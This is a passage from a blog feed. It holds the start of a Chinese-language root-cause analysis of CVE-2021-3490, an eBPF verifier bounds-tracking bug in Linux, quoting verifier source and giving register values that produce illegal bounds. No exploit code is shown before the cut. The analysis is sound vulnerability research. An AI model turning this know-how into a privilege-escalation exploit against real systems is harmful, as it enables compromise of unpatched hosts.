src="https://s2.loli.net/2023/07/14/qdhrM5PyWXYa1Bi.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/14/cdaSR5grHwkG4PL.png" alt="image.png"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03. 总结"></a>0x03. 总结</h1><p>感觉好像也没有什么好总结的…比较没啥亮点的两道套路题罢了…</p><p><img src="https://s2.loli.net/2023/07/14/TmiUfboV49py2rP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;典中典之低质量套路 Pwn 题集合&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://arttnba3.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://arttnba3.github.io/tags/CTF/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="CISCN" scheme="https://arttnba3.github.io/tags/CISCN/"/>
    
    <category term="UAF" scheme="https://arttnba3.github.io/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x0A】CVE-2021-3490 漏洞复现及简要分析</title>
    <link href="https://arttnba3.github.io/2023/06/04/CVE-0X0A-CVE-2021-3490/"/>
    <id>https://arttnba3.github.io/2023/06/04/CVE-0X0A-CVE-2021-3490/</id>
    <published>2023-06-03T18:59:40.000Z</published>
    <updated>2023-06-12T21:01:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>那一天，a3 终于回想起了被 VM Pwn 支配的恐怖</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3490">CVE-2021-3490</a> 是一个发生在 eBPF verifier 中的漏洞，由于 eBPF verifier 在校验位运算操作（ 与、或、异或 ）时没有正确地更新寄存器的 32 位边界，从而导致攻击者可以构造出非法的运行时寄存器值以进行提权；该漏洞在 <a href="https://lore.kernel.org/bpf/158560419880.10843.11448220440809118343.stgit@john-Precision-5820-Tower/">这个 commit</a> 中被引入，在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">这个 commit</a> 中被修复</p><p>本文我们选择内核版本 <code>5.11.16</code> 进行分析</p><blockquote><p>注：eBPF 相关基础知识可以看<a href="https://arttnba3.cn/2023/05/31/EBPF_0X00/">这↑里↓</a></p></blockquote><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01. 漏洞分析"></a>0x01. 漏洞分析</h1><p>eBPF 指令的合法性校验通过 eBPF verifier 完成，eBPF verifier 的核心函数便是 <code>do_check()</code>，该函数会遍历每一条指令并根据指令的不同类型进行不同操作，对于算术指令（<code>BPF_ALU</code> &#x2F; <code>BPF_ALU64</code>）而言有如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">do_check</span>()<span class="hljs-comment">// 遍历每一条指令并根据类型调用相应函数处理</span><br><span class="hljs-built_in">check_alu_op</span>()<span class="hljs-comment">// 根据算术指令的 opcode 进行不同处理</span><br><span class="hljs-built_in">adjust_reg_min_max_vals</span>()<span class="hljs-comment">// 计算新的寄存器边界值</span><br><span class="hljs-built_in">adjust_scalar_min_max_vals</span>()<span class="hljs-comment">// 根据 opcode 计算具体的新边界值</span><br></code></pre></td></tr></table></figure><p>在 <code>adjust_scalar_min_max_vals()</code> 函数当中会对 32 位与 64 位都进行边界校验（因为实际参与运算的可能是 32 也可能是 64），计算边界值的逻辑主要是先调用 <code>scalar32_min_max_xor()</code> 计算 32 位边界值再调用 <code>scalar_min_max_xor()</code> 计算 64 位边界值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* WARNING: 该函数在 64 位值上进行计算，但实际执行可能在 32 位值上，</span><br><span class="hljs-comment"> * 因此在 32 位的情况下，诸如位移等需要额外的检查.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_scalar_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state src_reg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_AND:<br>dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_and(dst_reg, &amp;src_reg);<span class="hljs-comment">/* 漏洞点 */</span><br>scalar_min_max_and(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_OR:<br>dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_or(dst_reg, &amp;src_reg);<span class="hljs-comment">/* 漏洞点 */</span><br>scalar_min_max_or(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_XOR:<br>dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_xor(dst_reg, &amp;src_reg);<span class="hljs-comment">/* 漏洞点 */</span><br>scalar_min_max_xor(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<span class="hljs-comment">//更新边界</span><br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在更新 32 位边界值时开发者认为如果两个寄存器的低 32 位都为 <code>known</code> 那就可以<strong>直接跳过</strong>，因为 64 位时还会进行更新：</p><blockquote><p><code>tnum_subreg_is_const()</code> 会看寄存器的 <code>var_off</code> 的 mask 的低 32 位是否为 0（即全部已知）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-comment">/* 假设 scalar64_min_max_and 将被调用，</span><br><span class="hljs-comment"> * 因此跳过为已知的 32位情况更新寄存器是安全的.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>在更新 64 位边界值时若两个寄存器都为 <code>known</code> 就直接调用 <code>__mark_reg_known()</code> <strong>将寄存器标为</strong> <code>known</code> <strong>并直接返回</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);<br>s64 smin_val = src_reg-&gt;smin_value;<br>u64 umax_val = src_reg-&gt;umax_value;<br><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known) &#123;<br>__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p><code>__mark_reg_known()</code> 其实就是简单的调用 <code>tnum_const()</code> 设置寄存器 <code>var_off</code> 为 <code>known</code> ，并给对应边界赋值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This helper doesn&#x27;t clear reg-&gt;id */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> ___mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br>reg-&gt;var_off = tnum_const(imm);<br>reg-&gt;smin_value = (s64)imm;<br>reg-&gt;smax_value = (s64)imm;<br>reg-&gt;umin_value = imm;<br>reg-&gt;umax_value = imm;<br><br>reg-&gt;s32_min_value = (s32)imm;<br>reg-&gt;s32_max_value = (s32)imm;<br>reg-&gt;u32_min_value = (u32)imm;<br>reg-&gt;u32_max_value = (u32)imm;<br>&#125;<br><br><span class="hljs-comment">/* 标记一个寄存器的未知部分 (变量偏移或标量值) </span><br><span class="hljs-comment"> * 为已知的值 @imm.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br><span class="hljs-comment">/* Clear id, off, and union(map_ptr, range) */</span><br><span class="hljs-built_in">memset</span>(((u8 *)reg) + <span class="hljs-keyword">sizeof</span>(reg-&gt;type), <span class="hljs-number">0</span>,<br>       offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off) - <span class="hljs-keyword">sizeof</span>(reg-&gt;type));<br>___mark_reg_known(reg, imm);<br>&#125;<br><br></code></pre></td></tr></table></figure></blockquote><p>但这样存在一个问题，<strong>若存在一个高 32 位 unknown 的寄存器，则不会调用</strong> <code>__mark_reg_known()</code> <strong>更新 32 位的边界值，而只会更新 64 位边界值</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 我们从 var_off 中获取最小值, 因为其本质上是按位的.</span><br><span class="hljs-comment"> * 我们的最大值为操作数中所有最大值的最小值.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;<br>dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);<br><span class="hljs-keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="hljs-number">0</span> || smin_val &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* 在加上负值时会丢失有符号的范围，</span><br><span class="hljs-comment"> * 没人有时间搞这个.  // 译注：原文如此</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = S64_MIN;<br>dst_reg-&gt;smax_value = S64_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* 两个正值做与还是正值, </span><br><span class="hljs-comment"> * 故可以很安全地将结果转为 s64.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;<br>dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;<br>&#125;<br><span class="hljs-comment">/* 我们可能从 var_off 中获取到更多 */</span><br>__update_reg_bounds(dst_reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里笔者举一个非常简单的<del>并且已经在其他各大师傅的漏洞分析的文章里用烂了的</del>例子：</p><ul><li><code>R2 = &#123; .value = 0x1, .mask = 0xffffffff00000000 &#125;;</code> ：该寄存器低 32 位值已知为 1，高 32 位不确定</li><li><code>R3 = &#123; .value = 0x100000002, .mask = 0x0 &#125;;</code> ：该寄存器 64 位值全部已知，为 <code>0x100000002</code></li></ul><p>假如我们将 R2 与 R3 做与运算，在刚进入 switch 时会先调用 <code>tnum_and()</code> 进行计算并将结构保存到 <code>R2-&gt;var_off</code>，由于 R3 全部确定而 R2 的高 32 位不确定，因此运算结果为 <code>&#123; .value = 0x0, .mask = 0x100000000 &#125;</code>，即仅有第 32 位是不确定的</p><p>接下来继续回到 <code>scalar_min_max_and()</code>中，该函数最后会调用 <code>__update_reg_bounds()</code> 对比寄存器的 <code>var_off</code> 并更新边界值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg32_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);<br><br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;s32_min_value = <span class="hljs-type">max_t</span>(s32, reg-&gt;s32_min_value,<br>var32_off.value | (var32_off.mask &amp; S32_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;s32_max_value = <span class="hljs-type">min_t</span>(s32, reg-&gt;s32_max_value,<br>var32_off.value | (var32_off.mask &amp; S32_MAX));<br>reg-&gt;u32_min_value = <span class="hljs-type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);<br>reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,<br> (u32)(var32_off.value | var32_off.mask));<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg64_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;smin_value = <span class="hljs-type">max_t</span>(s64, reg-&gt;smin_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;smax_value = <span class="hljs-type">min_t</span>(s64, reg-&gt;smax_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));<br>reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);<br>reg-&gt;umax_value = min(reg-&gt;umax_value,<br>      reg-&gt;var_off.value | reg-&gt;var_off.mask);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__update_reg32_bounds(reg);<br>__update_reg64_bounds(reg);<br>&#125;<br></code></pre></td></tr></table></figure><p>计算方法如下：</p><ul><li>最小边界值 &#x3D; 【<code>min_value</code> 、 <code>var_off</code> 已知值】中的最大者</li><li>最大边界值 &#x3D;【 <code>max_value</code> 、 <code>var_off</code> 已知值】中的最小者</li></ul><p>由于 R2 的 32 位初始边界值未经过更新，仍为其原值 <code>1</code>，因此经过该轮计算之后 R2 的<strong>最小值为 1，最大值为 0</strong>，而这显然是不合理的</p><p>回到  <code>adjust_scalar_min_max_vals()</code> 中，其最后也会调用 <code>__update_reg_bounds()</code> 对比寄存器的 <code>var_off</code> 并更新边界值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">default</span>:<br>mark_reg_unknown(env, regs, insn-&gt;dst_reg);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__reg_deduce_bounds()</code> 主要再做一次边界调整校验的工作，这里 32 位与 64 位都用的同一套逻辑：</p><ul><li>若有符号最小值边界大于等于 0 或 有符号最大值边界小于 0 ，则更新有符号最小值边界为有符号与无符号最小值边界中的最大值，并更新有符号最大值边界为有符号与无符号最大值边界中的最小值，之后直接返回</li><li>若无符号最大值边界没有超过有符号范围（最高位不为1），则将有符号最小值设为无符号最小值，有符号最大值设为有符号与无符号最大值中的最小值</li><li>否则，若无符号最小值边界超过有符号范围（最高位为1），则将有符号最小值设为有符号与无符号最小值中的最大值，将有符号最大值设为无符号最大值</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 使用有符号的最小/最大值赋值无符号, 反之亦然 */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg32_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* 从有符号边界中获取符号.</span><br><span class="hljs-comment"> * 若我们无法穿过符号边界，有符号与无符号边界相同，故合并.</span><br><span class="hljs-comment"> * 这在负数情况下也有用，例如：</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 意味着 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;s32_min_value &gt;= <span class="hljs-number">0</span> || reg-&gt;s32_max_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* 从无符号边界中获取边界.  </span><br><span class="hljs-comment"> * 有符号边界穿过了有符号范围，我们必须小心.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_max_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* 正数. 我们无法从 smin 获取任何东西, </span><br><span class="hljs-comment"> * 但 smax 是正数，因此是安全的.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value;<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_min_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* 负数.  我们无法从 smax 获取任何东西,</span><br><span class="hljs-comment"> * 但 smin 是负数，因此是安全的.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg64_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* Learn sign from signed bounds.</span><br><span class="hljs-comment"> * If we cannot cross the sign boundary, then signed and unsigned bounds</span><br><span class="hljs-comment"> * are the same, so combine.  This works even in the negative case, e.g.</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 implies 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;smin_value &gt;= <span class="hljs-number">0</span> || reg-&gt;smax_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* Learn sign from unsigned bounds.  Signed bounds cross the sign</span><br><span class="hljs-comment"> * boundary, so we must be careful.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s64)reg-&gt;umax_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Positive.  We can&#x27;t learn anything from the smin, but smax</span><br><span class="hljs-comment"> * is positive, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value;<br>reg-&gt;smax_value = reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s64)reg-&gt;umin_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Negative.  We can&#x27;t learn anything from the smax, but smin</span><br><span class="hljs-comment"> * is negative, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = reg-&gt;umax_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__reg32_deduce_bounds(reg);<br>__reg64_deduce_bounds(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p> <code>__reg_bound_offset()</code> 则是基于边界值范围重新计算 <code>var_off</code> 的值：</p><ul><li><code>tnum_range()</code>：取 min 中 min、max 的低位相同位部分，从第一个不同位开始设为未知</li><li><code>tnum_intersect()</code>：取 a、b 的共有已知为 1 的位</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_range</span><span class="hljs-params">(u64 min, u64 max)</span><br>&#123;<br>u64 chi = min ^ max, delta;<br>u8 bits = fls64(chi); <span class="hljs-comment">// 找到为 1 的最低位</span><br><br><span class="hljs-comment">/* 特殊情况， 需要这样因为 1ULL &lt;&lt; 64 是未定义的 */</span><br><span class="hljs-keyword">if</span> (bits &gt; <span class="hljs-number">63</span>)<br><span class="hljs-keyword">return</span> tnum_unknown;<br><span class="hljs-comment">/* 例如若 chi = 4, bits = 3, delta = (1&lt;&lt;3) - 1 = 7.</span><br><span class="hljs-comment"> * 若 chi = 0, bits = 0, delta = (1&lt;&lt;0) - 1 = 